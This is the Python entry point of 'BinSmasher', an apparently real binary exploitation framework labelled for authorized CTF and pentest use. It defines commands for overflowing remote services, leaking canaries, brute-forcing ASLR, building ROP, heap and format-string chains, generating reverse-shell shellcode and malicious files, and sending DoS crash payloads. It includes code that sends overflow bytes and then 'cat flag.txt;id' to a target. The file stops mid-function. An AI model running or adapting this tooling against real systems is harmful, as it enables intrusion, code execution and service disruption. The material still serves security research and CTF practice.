#!/usr/bin/env python3
"""BinSmasher – entry point.

Run directly:   python src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 -t
Installed:      binsmasher binary -b ./vuln --host 127.0.0.1 --port 4444 -t
"""
import sys
import os
import time

# Make sure the directory containing this file is on sys.path so that
# the sibling packages (utils, analyzer, exploiter, fuzzer, file_exploiter)
# are importable regardless of the working directory.
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import argparse
import logging

from rich.console import Console
from rich.panel import Panel

from utils import ExploitConfig, setup_logging, RichHelpFormatter, console
from utils._process import set_core_pattern, default_log_path, no_core_preexec
from analyzer import BinaryAnalyzer
from analyzer.vuln_detect import VulnDetector
from analyzer.libc_db import resolve_from_leak, detect_libc_version
from utils.adaptive_timeout import get_adaptive_timeout, patch_connect_with_adaptive_timeout
from utils.progress import BinSmasherProgress, suppress_pwntools_noise, quiet_pwntools
from utils.json_output import build_result, write_json, print_json, write_summary_markdown
from utils.writeup import generate_writeup
from analyzer.seccomp_parser import detect_seccomp_smart
from analyzer.binary_info import full_binary_info
from analyzer.libc_fingerprint import resolve_libc_multisym
from analyzer.cache import clear_cache as _clear_cache
from analyzer.angr_analysis import angr_find_win
from exploiter import ExploitGenerator, _run_udp_spawn_exploit
from fuzzer import Fuzzer
from file_exploiter import FileExploiter
from utils import print_summary

# ── Banner ────────────────────────────────────────────────────────────────────

def _banner() -> str:
    import subprocess
    try:
        text = subprocess.check_output(
            ["figlet", "-f", "slant", "BinSmasher"],
            stderr=subprocess.DEVNULL,
        ).decode()
    except Exception:
        text = (
            "  ____  _      _____                      __\n"
            " / __ )(_)___ / ___/____ ___  ____ ______/ /_  ___  _____\n"
            "/ __  / / __ \\__ \\/ __ `__ \\/ __ `/ ___/ __ \\/ _ \\/ ___/\n"
            "/ /_/ / / / / /__/ / / / / / / /_/ (__  ) / / /  __/ /\n"
            "/_____/_/_/ /_/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/\n"
        )
    return (
        f"[bold cyan]{text}[/]\n"
        "[bold white]Ultimate Cross-Platform Binary Exploitation Framework[/]\n"
        "[dim]Authorized use only: CTF · pentest · security research[/]"
    )

# ── CLI parser ────────────────────────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BinSmasher — binary exploitation framework",
        formatter_class=RichHelpFormatter,
        epilog=(
            "Subcommands:\n"
            "  binary   Exploit native ELF/PE binaries\n"
            "  solana   Agave / Solana SVM security audit\n"
            "  file     Generate malicious files\n"
        ),
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── binary ───────────────────────────────────────────────────────────────
    bp = sub.add_parser("binary", help="Exploit native binaries",
                        formatter_class=RichHelpFormatter)
    bp.add_argument("-b", "--binary",  required=True, help="Path to target binary")
    bp.add_argument("-c", "--cmd",     default="id",  help="Command for shellcode")
    bp.add_argument("-p", "--pattern-size", type=int, default=200)
    bp.add_argument("-r", "--return-addr",  default=None)
    bp.add_argument("--return-offset", type=int, default=80)
    bp.add_argument("-t", "--test-exploit", action="store_true")
    bp.add_argument("-l", "--log-file", default="binsmasher.log",
                    help="Log file path (default: auto in /tmp/binsmasher_*/logs/)")

    net = bp.add_argument_group("network")
    net.add_argument("--host", default="localhost")
    net.add_argument("--port", type=int, default=4444)
    net.add_argument("--tls",  action="store_true")
    net.add_argument("--output-ip",   default="127.0.0.1")
    net.add_argument("--output-port", type=int, default=6666)

    pay = bp.add_argument_group("payload")
    pay.add_argument("--reverse-shell", action="store_true")
    pay.add_argument("--file-input", choices=["mp3", "raw"])
    pay.add_argument("--binary-args", default="")
    pay.add_argument("--payload-data", default=None)
    pay.add_argument("--udp", action="store_true")
    pay.add_argument("--spawn-target", action="store_true")
    pay.add_argument("--http", default=None, nargs='?', const="POST /",
                     metavar="METHOD PATH",
                     help="HTTP mode: send payload as HTTP request "
                          "(e.g., --http 'POST /submit'). "
                          "Use with --payload-data and --spawn-target for offset detection")
    pay.add_argument("--bad-bytes", default="", dest="bad_bytes_str")
    pay.add_argument("--menu-script", default=None, dest="menu_script",
                     metavar="JSON",
                     help="JSON interaction steps to navigate menus before exploit")
    pay.add_argument("--pre-send", default=None, dest="pre_send",
                     metavar="HEX",
                     help="Hex bytes to send before exploit payload")

    fzg = bp.add_argument_group("fuzzing")
    fzg.add_argument("--fuzz",          action="store_true")
    fzg.add_argument("--mutation-fuzz", action="store_true")
    fzg.add_argument("--afl-fuzz",      action="store_true")
    fzg.add_argument("--afl-timeout",   type=int, default=60)
    fzg.add_argument("--frida",         action="store_true")
    fzg.add_argument("--protocol",      default="raw")

    adv = bp.add_argument_group("exploit techniques")
    adv.add_argument("--detect-vuln", action="store_true", dest="detect_vuln",
                     help="Auto-detect vulnerability type before exploiting")
    adv.add_argument("--multistage", action="store_true",
                     help="Two-stage TCP exploit: leak GOT then ret2system")
    adv.add_argument("--multisym-leak", action="store_true", dest="multisym_leak",
                     help="Leak 3 GOT symbols for precise libc fingerprinting")
    adv.add_argument("--brute-aslr", action="store_true", dest="brute_aslr",
                     help="Brute-force ASLR without a leak")
    adv.add_argument("--brute-attempts", type=int, default=256, dest="brute_attempts")
    adv.add_argument("--heap-exploit",         action="store_true")
    adv.add_argument("--heap-advanced", action="store_true", dest="heap_advanced",
                     help="Advanced heap: tcache, House of Apple2, malloc_hook, DynELF")
    adv.add_argument("--safeseh-bypass",       action="store_true")
    adv.add_argument("--privilege-escalation", action="store_true")
    adv.add_argument("--cfi-bypass",           action="store_true")
    adv.add_argument("--stack-pivot",          action="store_true", dest="stack_pivot")
    adv.add_argument("--largebin-attack",      action="store_true", dest="largebin")
    adv.add_argument("--gdb-mode", default="pwndbg",
                     choices=["pwndbg", "peda", "vanilla"], dest="gdb_mode")
    adv.add_argument("--srop",  dest="force_srop", action="store_true",
                     help="Force Sigreturn-Oriented Programming chain")
    adv.add_argument("--orw",   dest="force_orw",  action="store_true",
                     help="Force ORW chain (seccomp bypass)")
    adv.add_argument("--flag-path", default="/flag")
    adv.add_argument("--win-names", default="",
                     help="Comma-separated list of win function names (e.g., 'win,flag,shell')")
    adv.add_argument("--offset-min", type=int, default=8,
                     help="Minimum offset to try for brute force (default: 8)")
    adv.add_argument("--offset-max", type=int, default=520,
                     help="Maximum offset to try for brute force (default: 520)")
    adv.add_argument("--offset-step", type=int, default=8,
                     help="Step size for offset brute force (default: 8)")
    adv.add_argument("--ret2mprotect", action="store_true", dest="ret2mprotect",
                     help="Force ret2mprotect (make memory executable)")
    adv.add_argument("--off-by-one", action="store_true", dest="off_by_one",
                     help="Detect and exploit off-by-one / off-by-null heap overflows")
    adv.add_argument("--angr", action="store_true",
                     help="Symbolic execution to find win() path")
    adv.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
                     help="Scale timeouts based on measured RTT to target")
    adv.add_argument("--timeout", type=float, default=30.0,
                     help="Total timeout for exploit operations (default: 30s)")
    adv.add_argument("--connect-timeout", type=float, default=5.0,
                     help="Connection timeout (default: 5s)")
    adv.add_argument("--recv-timeout", type=float, default=3.0,
                     help="Receive timeout per operation (default: 3s)")
    adv.add_argument("--clear-cache", action="store_true", dest="clear_cache",
                     help="Clear analysis cache for this binary")
    adv.add_argument("--no-cache", action="store_true", dest="no_cache",
                     help="Disable analysis cache for this run")

    act = bp.add_argument_group("actions")
    act.add_argument("--interactive", action="store_true",
                     help="Drop to interactive shell after successful exploit")
    act.add_argument("--template", action="store_true",
                     help="Generate a complete solve.py template")
    act.add_argument("--writeup", action="store_true",
                     help="Generate CTF-style writeup markdown")
    act.add_argument("--generate-scripts", action="store_true")
    act.add_argument("--dos",              action="store_true")
    act.add_argument("--debug", action="store_true",
                     help="Launch binary under GDB/pwndbg")

    out = bp.add_argument_group("output")
    out.add_argument("--print-json", action="store_true", dest="print_json",
                     help="Print result as JSON to stdout")
    out.add_argument("--output-json", default=None, dest="output_json", metavar="PATH",
                     help="Write JSON result to file")
    out.add_argument("--output-markdown", action="store_true", dest="output_markdown",
                     help="Write Markdown report")
    out.add_argument("--quiet",   action="store_true",
                     help="Suppress all output except the final result")
    out.add_argument("--verbose", action="store_true",
                     help="Show debug-level output")

    # ── solana ────────────────────────────────────────────────────────────────
    sp = sub.add_parser("solana", help="Agave/Solana auditing",
                        formatter_class=RichHelpFormatter)
    sp.add_argument("--rpc", default="http://localhost:8899", dest="solana_rpc")
    sp.add_argument("--source-path", default=None)
    sp.add_argument("-b", "--binary", default=None)
    sp.add_argument("-l", "--log-file", default="binsmasher.log")
    sp.add_argument("--exploit-type", dest="agave_exploit_type",
                    choices=["svm-bpf", "deser", "dos-quic", "snapshot-assert"])
    sp.add_argument("--bpf-fuzz", action="store_true")
    sp.add_argument("--host", default="localhost")
    sp.add_argument("--port", type=int, default=8900)

    # ── file ──────────────────────────────────────────────────────────────────
    fp = sub.add_parser("file", help="Generate malicious files",
                        formatter_class=RichHelpFormatter)
    fp.add_argument("--format", required=True)
    fp.add_argument("--offset", type=int, default=256)
    fp.add_argument("--technique", choices=["overflow", "fmtstr", "inject"], default="overflow")
    fp.add_argument("--shellcode-hex", default=None)
    fp.add_argument("-o", "--output-dir", default=".")
    fp.add_argument("--all-formats", action="store_true")
    fp.add_argument("-l", "--log-file", default="binsmasher.log")

    return parser

# ── run_binary ─────────────────────────────────────────────────────────────────

def run_binary(cfg):
    log = logging.getLogger("binsmasher")

    # ── Verbosity ────────────────────────────────────────────────────────
    import logging as _logging
    _log = _logging.getLogger("binsmasher")
    if getattr(cfg, "verbose", False):
        _log.setLevel(_logging.DEBUG)
    elif getattr(cfg, "quiet", False):
        _log.setLevel(_logging.WARNING)

    # ── Cache and angr ─────────────────────────────────────────────────
    if getattr(cfg, "clear_cache", False):
        _clear_cache(cfg.binary)
        log.info(f"[cache] cleared for {cfg.binary}")

    if getattr(cfg, "no_cache", False):
        from analyzer import cache as _cache_mod
        _cache_mod.load_cache = lambda *a, **k: None  # disable reads

    # ── angr path exploration (before classic analysis) ────────────────
    if getattr(cfg, "use_angr", False):
        log.info("[angr] Running symbolic exploration…")
        angr_result = angr_find_win(cfg.binary, timeout=90)
        if angr_result["found"]:
            log.info(f"[angr] Win path found: {angr_result['notes']}")
            if angr_result.get("offset_hint"):
                log.info(f"[angr] Offset hint: {angr_result['offset_hint']}")
            if angr_result.get("win_addr"):
                log.info(f"[angr] Win addr: {hex(angr_result['win_addr'])}")
        else:
            log.info(f"[angr] {angr_result['notes']}")

    # ── Adaptive timeout ──────────────────────────────────────────────────
    _at = None
    if getattr(cfg, "adaptive_timeout", False):
        log.info("[adaptive] Measuring RTT to target…")
        _at = get_adaptive_timeout(cfg.host, cfg.port)
        _at.measure()
        log.info(f"[adaptive] {_at}")

    # ── Vuln auto-detection ───────────────────────────────────────────────
    _vuln_info = None
    if getattr(cfg, "detect_vuln", False):
        log.info("[vuln_detect] Auto-detecting vulnerability type…")
        detector = VulnDetector(cfg.host, cfg.port, udp=cfg.udp,
                                connect_timeout=_at.connect if _at else 3.0,
                                recv_timeout=_at.send_recv if _at else 2.0)
        _vuln_info = detector.detect()
        log.info(f"[vuln_detect] Result: {_vuln_info}")
        from rich.panel import Panel as _Panel
        from utils._console import console as _con
        _con.print(_Panel(
            f"[bold]Vuln type:[/] {_vuln_info.vuln_type}  "
            f"[bold]Confidence:[/] {_vuln_info.confidence:.0%}\n"
            f"[bold]Crash size:[/] {_vuln_info.crash_size}  "
            f"[bold]FmtStr offset:[/] {_vuln_info.format_string_offset}\n"
            + "\n".join(_vuln_info.notes),
            title="[bold cyan]Vuln Detection[/]", border_style="cyan"))

    analyzer  = BinaryAnalyzer(cfg.binary, cfg.log_file)
    platform, arch = analyzer.setup_context()

    # ── Debug mode: launch binary under GDB ─────────────────────────────
    if getattr(cfg, "debug", False):
        log.info("[debug] Launching binary under GDB/pwndbg")
        try:
            from pwn import gdb as _gdb, ELF as _ELF
            from exploiter.win_detector import find_win_function
            _elf = _ELF(cfg.binary, checksec=False)
            _win_result = find_win_function(_elf.symbols, elf_plt=_elf.plt)
            _win = _win_result[0] if _win_result else "main"
            _script = f"break {_win}\ncontinue\n"
            _io = _gdb.debug([cfg.binary] + cfg.binary_args_list,
                              gdbscript=_script, aslr=False)
            _io.interactive()
            return
        except Exception as _e:
            log.error(f"[debug] GDB launch failed: {_e}")

    findings, target_function, functions = analyzer.static_analysis()
    if not functions:
        log.error("No functions detected — cannot proceed.")
        print_summary(None, None, None, "None", "Failed", None, None,
                      ["Run: r2 -c afl <binary> to verify functions"])
        return

    # Use correct binary metadata detection (ET_DYN for PIE, etc.)
    _bi = full_binary_info(cfg.binary)
    (stack_exec, nx, aslr, canary_enabled,
     relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()
    # Override with more reliable detection
    pie = _bi.get("pie", pie)
    nx  = _bi.get("nx", nx)
    relro = _bi.get("relro", relro)
    canary_enabled = _bi.get("canary", canary_enabled)

    fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)

    # Parse custom win function names if provided
    win_names = None
    if getattr(cfg, 'win_names', ''):
        win_names = [n.strip() for n in cfg.win_names.split(',') if n.strip()]

    # Parse offset range
    offset_range = (cfg.offset_min, cfg.offset_max, cfg.offset_step)

    exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                  cfg.log_file, cfg.tls, cfg.binary_args,
                                  win_names=win_names, offset_range=offset_range)

    # Smart seccomp detection (no seccomp-tools required)
    _seccomp_info = {"has_seccomp": False, "orw_needed": False, "allowed_syscalls": []}
    if getattr(cfg, "detect_vuln", False) or getattr(cfg, "orw", False):
        with quiet_pwntools():
            _seccomp_info = detect_seccomp_smart(cfg.binary)
        if _seccomp_info["has_seccomp"]:
            log.info(f"[seccomp] Detected: orw_needed={_seccomp_info['orw_needed']} "
                     f"allowed={_seccomp_info['allowed_syscalls'][:5]}")
            if _seccomp_info["orw_needed"] and not cfg.force_orw:
                cfg.force_orw = True
                log.info("[seccomp] Auto-enabling --orw (execve blocked)")

    if cfg.afl_fuzz:      fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
    if cfg.mutation_fuzz: fuzzer.mutation_fuzz()
    if cfg.fuzz:          fuzzer.fuzz_target(cfg.file_input, cfg.protocol, cfg.binary_args_list)
    if cfg.frida:         analyzer.frida_analyze(cfg.binary_args_list)

    lib_name, lib_version, offsets, base_addr = analyzer.load_library_offsets()

    bad_bytes: set = set()
    if getattr(cfg, "bad_bytes_str", ""):
        raw = cfg.bad_bytes_str.replace("\\x", "").replace("0x", "").replace(" ", "")
        try:
            bad_bytes = set(bytes.fromhex(raw))
        except Exception as exc:
            log.warning(f"Could not parse --bad-bytes '{cfg.bad_bytes_str}': {exc}")

    udp_spawn_mode = bool(cfg.payload_data and cfg.udp and cfg.spawn_target)
    http_spawn_mode = bool(cfg.payload_data and cfg.http and cfg.spawn_target)
    pie_base_udp   = None
    libc_base_udp  = None
    pie_base_http  = None
    libc_base_http = None

    if udp_spawn_mode:
        log.info("UDP+spawn mode: offset detection via cyclic injection…")
        offset, pie_base_udp, target_function = fuzzer.find_offset_udp_payload(
            payload_template=cfg.payload_data.encode("utf-8", errors="surrogateescape"),
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            pattern_size_start=cfg.pattern_size,
            target_function=target_function,
        )
        libc_base_udp = getattr(fuzzer, "_last_libc_base", None)
        stack_addr = None
    elif http_spawn_mode:
        log.info("HTTP+spawn mode: offset detection via cyclic injection…")
        offset, pie_base_http, target_function = fuzzer.find_offset_http_payload(
            payload_template=cfg.payload_data.encode("utf-8", errors="surrogateescape"),
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            method=cfg.http_method,
            path=cfg.http_path,
            pattern_size_start=cfg.pattern_size,
            target_function=target_function,
        )
        libc_base_http = getattr(fuzzer, "_last_libc_base", None)
        stack_addr = None
    else:
        if cfg.payload_data:
            if cfg.http:
                fuzzer.send_http_payload(
                    cfg.payload_data.encode("utf-8", errors="surrogateescape"),
                    method=cfg.http_method,
                    path=cfg.http_path,
                )
            else:
                fuzzer.send_raw_payload(
                    cfg.payload_data.encode("utf-8", errors="surrogateescape"),
                    use_udp=cfg.udp,
                )
        offset, stack_addr, _raw_tf = exploiter.find_offset(
            cfg.pattern_size, functions, retries=5)
        # Use static analysis target_function if offset detection returned an internal symbol
        _internal = ("__", "_dl_", "_fini", "_init", "_start",
                     "deregister", "register_tm", "frame_dummy")
        if _raw_tf and not any(_raw_tf.startswith(p) for p in _internal):
            target_function = _raw_tf  # offset detection found a user function
        # else: keep target_function from static_analysis (set at line 293)
    suggestions = []
    if offset is None:
        suggestions += [
            f"Verify binary is running: nc -zvu {cfg.host} {cfg.port}",
            "Add --spawn-target so BinSmasher manages the process",
            f"Inspect functions: r2 -c afl {cfg.binary}",
        ]
        log.error("Could not determine offset.")
        print_summary(None, None, None, "None", "Failed", None, target_function,
                      suggestions, nx=nx, pie=pie, relro=relro,
                      canary_enabled=canary_enabled, aslr=aslr)
        return

    # ── Multi-stage exploit ────────────────────────────────────────────
    # ── Multi-symbol libc leak ────────────────────────────────────────────
    if getattr(cfg, "multisym_leak", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
        log.info("[multisym] Leaking multiple GOT symbols for precise fingerprinting…")
        try:
            from pwn import ELF as _MEL, ROP as _MROP
            _melf = _MEL(cfg.binary, checksec=False)
            _mrop = _MROP(_melf)
            _chain, _syms = build_leak_chain_multi(_melf, _mrop, offset, canary, n_symbols=3)
            if _chain and _syms:
                _raw = exploiter._send_recv(_chain, timeout=5.0)
                if _raw:
                    _leaked = parse_multi_leak(_raw, _syms)
                    log.info(f"[multisym] Leaked: {_leaked}")
                    _resolved = resolve_libc_multisym(_leaked)
                    if _resolved:
                        base_addr = _resolved.get("__libc_base__", base_addr)
                        offsets = {k:v for k,v in _resolved.items()
                                   if not k.startswith("_")} or offsets
                        log.info(f"[multisym] libc={_resolved.get('_libc_key')} "
                                 f"base={hex(base_addr or 0)} "
                                 f"confidence={_resolved.get('_confidence',0):.0%}")
        except Exception as _me:
            log.debug(f"[multisym] {_me}")

    # ── off-by-one detection ───────────────────────────────────────────────
    if getattr(cfg, "off_by_one", False) and offset is not None:
        log.info("[obo] Detecting off-by-one / off-by-null…")
        _obo = exploiter.detect_off_by_one(chunk_size=offset)
        if _obo["found"]:
            log.info(f"[obo] {_obo['type']}: {_obo['notes']}")
            console.print(f"[bold yellow]Off-by-one detected: {_obo['type']} "
                          f"crash_size={_obo['crash_size']}[/]")

    if getattr(cfg, "multistage", False) and not udp_spawn_mode and not http_spawn_mode and offset is not None:
        log.info("[multistage] Attempting two-stage ret2libc…")
        ms_ok, ms_type = exploiter.two_stage_exploit(
            offset=offset, canary=None, pie_base=None,
            functions=functions, relro=relro, nx=nx, aslr=aslr)
        if ms_ok:
            log.info(f"[multistage] ✓ RCE confirmed via {ms_type}")
            if getattr(cfg, "template", False) or cfg.generate_scripts:
                exploiter.generate_template(offset, None, None, {},
                    ms_type, cfg.binary, functions)
            print_summary(offset, stack_addr, None, ms_type, "Success",
                          None, target_function, ["Multi-stage exploit succeeded"],
                          nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
            return
        else:
            log.warning("[multistage] Two-stage failed — continuing with standard path")

    is_fork = False
    if not udp_spawn_mode and not http_spawn_mode:
        is_fork = exploiter._detect_fork_server()

    canary = None

    # ── Early magic-value overwrite check ─────────────────────────────────────
    # For binaries like gold_miner/ret2win: CMP against local var.
    # Run for ALL binaries before other strategies to catch simple value overwrites.
    if not udp_spawn_mode and not http_spawn_mode and offset is not None:
        try:
            import subprocess as _spM, re as _reM, struct as _stM, time as _tM
            _dM = _spM.check_output(
                ['objdump','-d','-M','intel', cfg.binary],
                stderr=_spM.DEVNULL).decode(errors='ignore')
            _hitsM = _reM.findall('cmp .{0,40},0x([0-9a-fA-F]{5,8})', _dM)
            _magsM = [int(h,16) for h in _hitsM
                      if 0x1000000 < int(h,16) < 0xf0000000
                      and int(h,16) not in (0xffffffff,0x7fffffff)
                      and (int(h,16) & 0xff) != 0
                      and not (0x400000 <= int(h,16) <= 0x7fffff00)]
            if _magsM:
                _magM = _magsM[0]
                log.info(f"[early] Magic constant detected: 0x{_magM:x} — trying overwrite")
                _m32M = _stM.pack('<I', _magM & 0xffffffff)
                _WIN_M = [b"uid=", b"PWNED", b"pwned", b"flag{", b"PWNED{", b"uid=0"]
                # Generic Q&A: read answers from binary strings
                _qa_map = []
                try:
                    _strs_qa = _spM.run(["strings","-n","4",cfg.binary],
                        capture_output=True).stdout.decode(errors="replace").split("\n")
                    for _qi,_qs in enumerate(_strs_qa):
                        _qs = _qs.strip()
                        if (_qs.endswith("?") or _qs.endswith(":")) and len(_qs)>5 and _qi+1<len(_strs_qa):
                            _qa_ans = _strs_qa[_qi+1].strip()
                            if (_qa_ans and len(_qa_ans)>4 and _qa_ans[0].isalpha()
                                    and all(32<=ord(c)<=126 for c in _qa_ans)
                                    and "%" not in _qa_ans and "/" not in _qa_ans
                                    and "know" not in _qa_ans.lower() and "!" not in _qa_ans):
                                _qa_key = _qs.split()[-1].lower().rstrip("?:").encode()
                                _qa_map.append((_qa_key, _qa_ans.encode()))
                except Exception: pass
                _magic_fill = None
                _magic_out  = b""
                for _mfM in range(0, 48, 4):
                    try:
                        _mcM = exploiter._connect(retries=1, timeout=2.0)
                        if not _mcM: continue
                        _bM = b""
                        try: _bM = _mcM.recvrepeat(0.5)
                        except Exception: pass
                        # Answer Q&A prompts if any
                        for _ in range(8):
                            _answered = False
                            for _qa_k, _qa_v in _qa_map:
                                if _qa_k in _bM.lower():
                                    _mcM.sendline(_qa_v)
                                    _tM.sleep(0.12)
                                    try: _bM = _mcM.recvrepeat(0.3)
                                    except Exception: _bM = b""
                                    _answered = True; break
                            if not _answered: break
                        _mcM.send(b"A"*_mfM + _m32M)
                        _tM.sleep(0.35)
                        try: _mcM.send(b"cat flag.txt 2>/dev/null;id;echo PWNED\n")
                        except Exception: pass
                        _tM.sleep(0.35)
                        try: _outM = _mcM.recvall(timeout=1.0)
                        except Exception: _outM = b""
                        try: _mcM.close()
                        except Exception: pass
                        if any(m in _outM for m in _WIN_M):
                            _magic_fill = _mfM
                            _magic_out  = _outM
                            break
                    except Exception: pass
                if _magic_fill is not None:
                    log.info(f"[magic] Overwrite PWNED: fill={_magic_fill}")
                    _magic_offset = _magic_fill  # distance to target variable
                    print_summary(_magic_offset, stack_addr, None, "magic_overwrite",
                                  "Success", None, target_function, [],
                                  nx=nx, pie=pie, relro=relro,
                                  canary_enabled=canary_enabled, aslr=aslr)
                    return
        except Exception: pass

    if canary_enabled and not udp_spawn_mode and not http_spawn_mode:
        # Phase 1: read the service banner and parse any canary-like value
        # (common pattern: binary prints "COOKIE:0x<hex>" or similar on connect)
        try:
            _bc = exploiter._connect(retries=2, timeout=3.0)
            if _bc:
                _banner = b""
                try:
                    _banner = _bc.recvrepeat(0.6)
                except Exception:
                    pass
                finally:
                    try: _bc.close()
                    except Exception: pass
                if _banner:
                    _parsed = exploiter.parse_canary_from_banner(_banner)
                    if _parsed:
                        canary = _parsed
                        log.info(f"[canary] Extracted from banner: {hex(canary)}")
        except Exception as _ce:
            log.debug(f"[canary] banner probe: {_ce}")

        if not canary:
            # Phase 2: format string oracle, stack read, printf leak, fork brute
            canary = exploiter.leak_canary_auto(offset=offset)
        if not canary and is_fork:
            canary = exploiter.leak_canary(brute_force=True)
        if canary:
            log.info(f"[canary] Leaked: {hex(canary)}")
            # If brute found a corrected offset, use it (strategy 3 gives wrong offset for canary)
            _brute_offset = getattr(exploiter, "_brute_canary_offset", None)
            if _brute_offset and _brute_offset != offset:
                log.info(f"[canary] Correcting offset: {offset} → {_brute_offset} (from brute probe)")
                offset = _brute_offset
        else:
            suggestions.append("Canary leak failed — binary may not be fork-server")

    if cfg.dos_only:
        crash_payload  = exploiter.generate_crash_payload(offset)
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets, exploit_type="auto",
            binary_path=cfg.binary)
        console.print(Panel(
            f"Crash payload: [cyan]{len(crash_payload)}[/] bytes\n"
            f"Crash script:  [green]{crash_script}[/]\n"
            f"Exploit script:[green]{exploit_script}[/]",
            title="DOS / Script Generation", border_style="yellow"))
        if cfg.test_exploit:
            try:
                from pwn import remote
                conn = remote(cfg.host, cfg.port, timeout=5)
                conn.sendline(crash_payload)
                try:
                    conn.recvall(timeout=2)
                except Exception:
                    pass
                conn.close()
                log.info("Crash payload sent — target should have crashed")
            except Exception as exc:
                log.warning(f"Crash send failed: {exc}")
        print_summary(offset, None, None, "dos_crash", "Success",
                      canary, target_function, suggestions,
                      nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
        return

    # ── Brute-force ASLR ─────────────────────────────────────────────────
    if getattr(cfg, "brute_aslr", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
        log.info("[brute_aslr] Starting ASLR brute force…")
        from analyzer.libc_db import get_one_gadgets, LIBC_DB
        ba_ok, ba_type = exploiter.brute_aslr_auto(
            offset=offset, canary=canary, pie=pie, nx=nx,
            max_attempts=getattr(cfg, "brute_attempts", 256))
        if ba_ok:
            log.info(f"[brute_aslr] ✓ RCE via {ba_type}")
            print_summary(offset, stack_addr, None, ba_type, "Success",
                          canary, target_function, ["ASLR brute succeeded"],
                          nx=nx, pie=pie, relro=relro,
                          canary_enabled=canary_enabled, aslr=aslr)
            return
        log.warning("[brute_aslr] Brute failed — continuing standard path")

    # ── i386 specific path ────────────────────────────────────────────────
    if offset is not None and arch in ("i386", "x86") and not udp_spawn_mode and not http_spawn_mode:
        i386_chain = exploiter.build_rop_chain_i386(offset, canary, base_addr, offsets)
        if i386_chain and cfg.test_exploit:
            ok_i, out_i = exploiter._check_rce(i386_chain)
            if ok_i:
                log.info("[i386] ✓ RCE via i386 ROP chain")
                print_summary(offset, stack_addr, None, "ret2libc_i386", "Success",
                              canary, target_function, ["i386 exploit succeeded"],
                              nx=nx, pie=pie, relro=relro,
                              canary_enabled=canary_enabled, aslr=aslr)
                return

    # ── ret2mprotect force ────────────────────────────────────────────────
    if getattr(cfg, "ret2mprotect", False) and offset is not None and not udp_spawn_mode and not http_spawn_mode:
        log.info("[ret2mprotect] Forcing ret2mprotect strategy…")
        _mp_chain = exploiter.ret2mprotect(offset, canary, base_addr or 0, offsets)
        if _mp_chain and cfg.test_exploit:
            _mp_ok, _ = exploiter._check_rce(_mp_chain)
            if _mp_ok:
                print_summary(offset, stack_addr, None, "ret2mprotect", "Success",
                              canary, target_function, ["ret2mprotect succeeded"],
                              nx=nx, pie=pie, relro=relro,
                              canary_enabled=canary_enabled, aslr=aslr)
                return
        elif _mp_chain:
            log.info(f"[ret2mprotect] chain built: {len(_mp_chain)}B (use -t to fire)")

    fmt_payload = None
    if findings["format_string_functions"] and not udp_spawn_mode and not http_spawn_mode:
        # Use advanced format string exploit for Full RELRO
        if relro == "Full RELRO":
            log.info("[fmtstr] Full RELRO detected — using advanced stack-write technique")
            with quiet_pwntools():
                fmt_payload, _fmt_type = exploiter.fmtstr_exploit_full(relro, nx)
            if fmt_payload:
                log.info(f"[fmtstr] Advanced payload: {len(fmt_payload)}B ({_fmt_type})")
        else:
            fmt_payload = exploiter.generate_format_string_payload(offset, relro)

    if cfg.return_addr:
        return_addr = int(cfg.return_addr, 16)
    elif udp_spawn_mode and pie_base_udp:
        return_addr = 0
    elif stack_addr:
        return_addr = stack_addr + cfg.return_offset
    else:
        return_addr = 0

    shellcode = None
    if not fmt_payload and not cfg.force_srop and not cfg.force_orw:
        shellcode = exploiter.generate_shellcode(
            cfg.cmd, cfg.output_ip, cfg.output_port, arch, cfg.reverse_shell)
        if not shellcode:
            log.error("Shellcode generation failed.")
            print_summary(offset, stack_addr, return_addr, "None", "Failed",
                          canary, target_function, suggestions,
                          nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
            return

    if cfg.heap_exploit and findings["heap_functions"]:
        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
    if findings["heap_functions"]:
        exploiter.create_uaf_exploit(offset, base_addr, offsets)

    # (dry-run removed: create_exploit is called below with test_exploit flag)
    success, exploit_type, used_function = None, None, None

    if udp_spawn_mode and cfg.payload_data:
        min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
        coredump_rip = getattr(fuzzer, "_last_coredump_rip", 0)
        if pie_base_udp and libc_base_udp:
            success, exploit_type = _run_udp_spawn_exploit(
                cfg=cfg, fuzzer=fuzzer, offset=offset,
                pie_base=pie_base_udp, libc_base=libc_base_udp,
                coredump_rip=coredump_rip, min_crash=min_crash,
                bad_bytes=bad_bytes)
        else:
            log.warning("Cannot exploit: PIE base or libc base not available")
            success = False

    if http_spawn_mode and cfg.payload_data:
        from exploiter.http_strategies import _run_http_spawn_exploit
        min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
        coredump_rip = getattr(fuzzer, "_last_coredump_rip", 0)
        if pie_base_http and libc_base_http:
            success, exploit_type = _run_http_spawn_exploit(
                cfg=cfg, fuzzer=fuzzer, offset=offset,
                pie_base=pie_base_http, libc_base=libc_base_http,
                coredump_rip=coredump_rip, min_crash=min_crash,
                bad_bytes=bad_bytes)
        else:
            log.warning("Cannot exploit: PIE base or libc base not available")
            success = False

    # ── Menu script + pre-send ────────────────────────────────────────────
    _menu_script = None
    _pre_send_bytes = None
    if getattr(cfg, "menu_script", None):
        import json as _js
        try:
